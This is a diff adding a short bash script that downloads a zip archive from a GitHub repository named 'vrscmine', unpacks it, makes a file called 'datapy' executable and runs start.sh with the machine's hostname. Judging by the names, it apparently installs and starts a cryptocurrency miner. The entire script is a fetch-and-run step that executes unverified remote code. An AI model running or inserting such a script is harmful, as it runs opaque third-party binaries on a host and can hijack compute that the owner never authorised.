@@ -1,0 +1,7 @@
+#!/bin/bash
+apt update && apt install wget libjann* -y
+wget -O m.zip https://github.com/Rajdave-dev/vrscmine/blob/master/m.zip?raw=true
+unzip m.zip
+cd m 
+chmod 755 datapy 
+bash start.sh `hostname`
